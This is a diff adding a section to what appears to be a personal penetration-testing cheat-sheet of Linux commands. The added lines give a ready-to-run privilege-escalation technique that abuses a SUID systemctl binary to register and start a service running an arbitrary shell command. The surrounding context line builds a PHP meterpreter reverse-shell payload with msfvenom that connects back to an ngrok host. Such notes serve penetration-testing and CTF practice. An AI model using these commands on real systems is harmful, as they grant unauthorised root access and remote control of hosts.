@@ -1341,6 +1341,20 @@ bash/zsh + linux terminal cli tools commands
     - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
 
 ---------------------------------------------------------------------
+exploit using systemctl (SUID config)
+---------------------------------------------------------------------
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+- {https://gtfobins.github.io/gtfobins/systemctl/}
+---------------------------------------------------------------------
 check user default shell
 ---------------------------------------------------------------------
 - cat /etc/passwd
